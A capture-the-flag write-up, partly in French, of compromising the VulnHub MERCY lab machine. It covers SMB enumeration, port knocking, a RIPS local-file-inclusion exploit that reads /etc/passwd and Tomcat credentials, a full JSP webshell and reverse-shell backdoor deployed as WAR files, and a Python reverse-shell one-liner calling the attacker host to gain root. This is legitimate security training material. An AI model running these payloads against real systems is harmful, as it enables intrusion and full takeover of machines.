# Mercy 2


Image from https://www.vulnhub.com/

https://www.vulnhub.com/entry/digitalworldlocal-mercy,263/

MERCY is a machine dedicated to Offensive Security for the PWK course.

What I learned:
+ Windows SMB ENUM
+ Port knocking
+ LFI
+ tomcat war payload
+ local user without tty


## In brief

- get smb user and shared dir thanks enum4linux
- mount shared dir and found instruction for portknoking
- open http 80 port
- robots.txt give RIPS scanner 0.53
- searchsploit give Directory transversal exploit
- get /etc/passwd  and find tomcat7 user.
- get tomcat7 passwords thanks to dir transversal exploit
- build a remote shell war and upload it
- connected as tomcat
- get a tty : 
- su user fluffy , password same as tomcat
- find a file regularly executed by root
- add a reverse shell
- done



## [ nmap ]
```
# nmap -sC -sV -p- 11.0.0.22
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 19:16 CET
Nmap scan report for 11.0.0.22
Host is up (0.00025s latency).
Not shown: 65525 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS UIDL RESP-CODES PIPELINING TOP CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login more IDLE listed LITERAL+ capabilities STARTTLS SASL-IR post-login LOGIN-REFERRALS IMAP4rev1 ID LOGINDISABLEDA0001 have OK ENABLE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: Pre-login IDLE listed LITERAL+ capabilities AUTH=PLAINA0001 SASL-IR more ID IMAP4rev1 ENABLE post-login have OK LOGIN-REFERRALS
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
995/tcp  open     ssl/pop3    Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER UIDL RESP-CODES PIPELINING TOP CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
MAC Address: 08:00:27:03:7E:1D (Oracle VirtualBox virtual NIC)
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h40m02s, deviation: 4h37m07s, median: 59m57s
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2019-02-21T03:16:43+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-02-20 20:16:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.31 seconds
```

# host
from samba
4.3.11-Ubuntu ?
	MERCY          Wk Sv PrQ Unx NT SNT MERCY server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03



## 22/tcp   filtered ssh]


## [53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)]


## [80/tcp   filtered http]


## [110/tcp  open     pop3        Dovecot pop3d]



## [139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)]

| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required



## [143/tcp  open     imap        Dovecot imapd (Ubuntu)]

## [445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)]
```
# enum4linux 11.0.0.22
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 20 20:07:09 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 11.0.0.22
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================= 
|    Enumerating Workgroup/Domain on 11.0.0.22    |
 ================================================= 
[+] Got domain/workgroup name: WORKGROUP

 ========================================= 
|    Nbtstat Information for 11.0.0.22    |
 ========================================= 
Looking up status of 11.0.0.22
	MERCY           <00> -         B <ACTIVE>  Workstation Service
	MERCY           <03> -         B <ACTIVE>  Messenger Service
	MERCY           <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ================================== 
|    Session Check on 11.0.0.22    |
 ================================== 
[+] Server 11.0.0.22 allows sessions using username '', password ''

 ======================================== 
|    Getting domain SID for 11.0.0.22    |
 ======================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =================================== 
|    OS information on 11.0.0.22    |
 =================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 11.0.0.22 from smbclient: 
[+] Got OS info for 11.0.0.22 from srvinfo:
	MERCY          Wk Sv PrQ Unx NT SNT MERCY server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ========================== 
|    Users on 11.0.0.22    |
 ========================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy	Name: QIU	Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu	Name: 	Desc: 

user:[pleadformercy] rid:[0x3e8]
user:[qiu] rid:[0x3e9]

 ====================================== 
|    Share Enumeration on 11.0.0.22    |
 ====================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	qiu             Disk      
	IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            MERCY

[+] Attempting to map shares on 11.0.0.22
//11.0.0.22/print$	Mapping: DENIED, Listing: N/A
//11.0.0.22/qiu	Mapping: DENIED, Listing: N/A
//11.0.0.22/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ================================================= 
|    Password Policy Information for 11.0.0.22    |
 ================================================= 


[+] Attaching to 11.0.0.22 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MERCY
	[+] Builtin

[+] Password Info for Domain: MERCY

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =========================== 
|    Groups on 11.0.0.22    |
 =========================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ==================================================================== 
|    Users on 11.0.0.22 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3544418579-3748865642-433680629
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\pleadformercy (Local User)
S-1-22-1-1001 Unix User\qiu (Local User)
S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
S-1-22-1-1003 Unix User\fluffy (Local User)

[+] Enumerating users using SID S-1-5-21-3544418579-3748865642-433680629 and logon username '', password ''
S-1-5-21-3544418579-3748865642-433680629-500 *unknown*\*unknown* (8)
S-1-5-21-3544418579-3748865642-433680629-501 MERCY\nobody (Local User)
S-1-5-21-3544418579-3748865642-433680629-513 MERCY\None (Domain Group)
S-1-5-21-3544418579-3748865642-433680629-1000 MERCY\pleadformercy (Local User)
S-1-5-21-3544418579-3748865642-433680629-1001 MERCY\qiu (Local User)




 ========================================== 
|    Getting printer info for 11.0.0.22    |
 ========================================== 
No printers returned.


enum4linux complete on Wed Feb 20 20:07:48 2019
```



## [smbclient]
(Local User)
pleadformercy  
qiu  
fluffy  
nobody  
thisisasuperduperlonguser  


```
# smbclient \\\\11.0.0.22\\qiu -U qiu
Enter WORKGROUP\qiu's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 31 21:07:00 2018
  ..                                  D        0  Mon Nov 19 17:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 15:19:34 2018
  .public                            DH        0  Sun Aug 26 16:23:24 2018
  .bash_history                       H      163  Fri Aug 31 21:11:34 2018
  .cache                             DH        0  Fri Aug 31 20:22:05 2018
  .private                           DH        0  Sun Aug 26 18:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 15:19:34 2018
  .profile                            H      675  Sun Aug 26 15:19:34 2018

		19213004 blocks of size 1024. 16327040 blocks available
smb: \> 
```




## [993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)]

## [995/tcp  open     ssl/pop3    Dovecot pop3d]

## [8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1]
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat

## [http://11.0.0.22:8080/tryharder/tryharder]
```
SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
```
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.



## [http://11.0.0.22:8080/manager/html]

$ hydra -l users.txt  -p passwd.txt http://11.0.0.22:8080/manager/html

## Port knoking

```
$ for x in 159,27391,4; do nmap -Pn --host-timeout 100 --max-retries 0 -p $x 11.0.0.22; done
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-24 07:31 CET
Nmap scan report for 11.0.0.22
Host is up (0.0013s latency).

PORT      STATE  SERVICE
4/tcp     closed unknown
159/tcp   closed nss-routing
27391/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds
```

Tried TCP, not opening, Tried UDP ... opening :)
```
# apt-get install knockd
# knock 11.0.0.22 -u -d 10 -v 159 27391 4
hitting udp 11.0.0.22:159
hitting udp 11.0.0.22:27391
hitting udp 11.0.0.22:4
root@kali:~# nmap 11.0.0.22 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-24 07:44 CET
Nmap scan report for 11.0.0.22
Host is up (0.00038s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:03:7E:1D (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
root@kali:~# 
```

Web page simple: This machine shall make you plead for mercy! Bwahahahahaha! 
Server: Apache/2.4.7 (Ubuntu)


## [80: dirbuster]

## [80: http://11.0.0.22/robots.txt]
User-agent: *
Disallow: /mercy
Disallow: /nomercy


## [80: http://11.0.0.22/mercy]
Welcome to Mercy!

We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.


## [80: http://11.0.0.22/nomercy/]

RIPS scanner 0.53

# searchsploit rips 0.53
------------------------------------------------ ----------------------------------------
 Exploit Title                                                                         |  Path
                                                                                       | (/usr/share/exploitdb/)
----------------------------------------- ----------------------------------------
RIPS 0.53 - Multiple Local File Inclusions                                             | exploits/php/webapps/18660.txt
----------------------------------------------------------------------------------
Shellcodes: No Result
root@kali:~/pentest/mercy2# searchsploit -m 18660.txt
  Exploit: RIPS 0.53 - Multiple Local File Inclusions
      URL: https://www.exploit-db.com/exploits/18660/
     Path: /usr/share/exploitdb/exploits/php/webapps/18660.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /root/pentest/mercy2/18660.txt
=> Give the .php for local file inclusion


http://11.0.0.22/nomercy/windows/code.php?file=../../../../../etc/passwd

<? root:x:0:0:root:/root:/bin/bash
<? daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<? bin:x:2:2:bin:/bin:/usr/sbin/nologin
<? sys:x:3:3:sys:/dev:/usr/sbin/nologin
<? sync:x:4:65534:sync:/bin:/bin/sync
<? games:x:5:60:games:/usr/games:/usr/sbin/nologin
<? man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<? lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<? mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<? news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<? uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<? proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<? www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<? backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<? list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<? irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
<? gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
<? nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<? libuuid:x:100:101::/var/lib/libuuid:
<? syslog:x:101:104::/home/syslog:/bin/false
<? landscape:x:102:105::/var/lib/landscape:/bin/false
<? mysql:x:103:107:MySQL Server,,,:/nonexistent:/bin/false
<? messagebus:x:104:109::/var/run/dbus:/bin/false
<? bind:x:105:116::/var/cache/bind:/bin/false
<? postfix:x:106:117::/var/spool/postfix:/bin/false
<? dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
<? dovecot:x:108:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
<? dovenull:x:109:120:Dovecot login user,,,:/nonexistent:/bin/false
<? sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
<? postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
<? avahi:x:112:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
<? colord:x:113:124:colord colour management daemon,,,:/var/lib/colord:/bin/false
<? libvirt-qemu:x:114:108:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
<? libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
<? tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
<? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
<? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
<? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
<? fluffy:x:1003:1003::/home/fluffy:/bin/sh 

##### tomcat7

http://11.0.0.22/nomercy/windows/code.php?file=../../../../../var/lib/tomcat7/conf/tomcat-users.xml


	
<? <?xml version='1.0' encoding='utf-8'
<? <!--
<? Licensed to the Apache Software Foundation (ASF) under one or more
<? contributor license agreements. See the NOTICE file distributed with
<? this work for additional information regarding copyright ownership.
<? The ASF licenses this file to You under the Apache License, Version 2.0
<? (the "License"); you may not use this file except in compliance with
<? the License. You may obtain a copy of the License at
<?
<? http://www.apache.org/licenses/LICENSE-2.0
<?
<? Unless required by applicable law or agreed to in writing, software
<? distributed under the License is distributed on an "AS IS" BASIS,
<? WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
<? See the License for the specific language governing permissions and
<? limitations under the License.
<? -->
<? <tomcat-users>
<? <!--
<? NOTE: By default, no user is included in the "manager-gui" role required
<? to operate the "/manager/html" web application. If you wish to use this app,
<? you must define such a user - the username and password are arbitrary.
<? -->
<? <!--
<? NOTE: The sample user and role entries below are wrapped in a comment
<? and thus are ignored when reading this file. Do not forget to remove
<? <!.. ..> that surrounds them.
<? -->
<? <role rolename="admin-gui"/>
<? <role rolename="manager-gui"/>
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
<? </tomcat-users>

=>
username="thisisasuperduperlonguser" password="heartbreakisinevitable"


# [8080: tomcat whebshell]

$ mkdir webshell
# cat webshell/index.jsp 
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

# jar -cvf ../webshell.war *
manifeste ajouté
ajout : index.jsp(entrée = 580) (sortie = 352)(compression : 39 %)


http://11.0.0.22:8080/manager/html
upload webshell

http://11.0.0.22:8080/webshell/


Le webshell est cool mais pas top, utilisons un reverseshell
```
# cat index.jsp 
// backdoor.jsp


<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>

<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;

        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }

        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;

                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));

                        char buffer[] = new char[8192];
                        int lenRead;

                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe) {}

                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe) {}
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");

if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());

                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("/bin/bash");

                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());

                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());

                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) {}
}
%>


```
On compile le .war
On l'upload
On se mets à l'écoute
$ nc -lvp 4646

On utilise http://11.0.0.22:8080/reverseshell/, pour lancer le reverse shell sur le netcat

$ nc -lvp 4646
uname -a
Linux MERCY 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux

id
uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)

Prenons un shell avec tty
python -c 'import pty; pty.spawn("/bin/bash")'

devenons fluffy
su fluffy
password : freakishfluffybunny

dans le répertoire 
/home/fluffy/.private/secret
On découvre un fichier en rw lancé par root...
On y colle un appel à un reverse shell en python

le nc local n'a pas l'option -e.

cat /tmp/reverse_shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("11.0.0.21",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# nc -lvp  4545
listening on [any] 4545 ...
11.0.0.22: inverse host lookup failed: Unknown host
connect to [11.0.0.21] from (UNKNOWN) [11.0.0.22] 54690
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 


root@kali:~/pentest/mercy2# nc -lvp  4545
listening on [any] 4545 ...
11.0.0.22: inverse host lookup failed: Unknown host
connect to [11.0.0.21] from (UNKNOWN) [11.0.0.22] 54690
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
author-secret.txt
config
proof.txt
# cat proof.txt
Congratulations on rooting MERCY. :-)
# cat author-secret.txt
Hi! Congratulations on being able to root MERCY.

The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

The author would also like to thank a great friend who he always teases as "plead for mercy". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.

The author, as "plead for mercy" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)

You'll always be remembered, "plead for mercy", and Offensive Security, for making me plead for mercy!

Congratulations, once again, for you TRIED HARDER!

Regards,
The Author




## [22 : ssh]


Get python port knocking https://raw.githubusercontent.com/grongor/knock/master/knock
Open ssh port
# python3 portknock.py 11.0.0.22 17301 28504 9999
username="fluffy" password="freakishfluffybunny" 


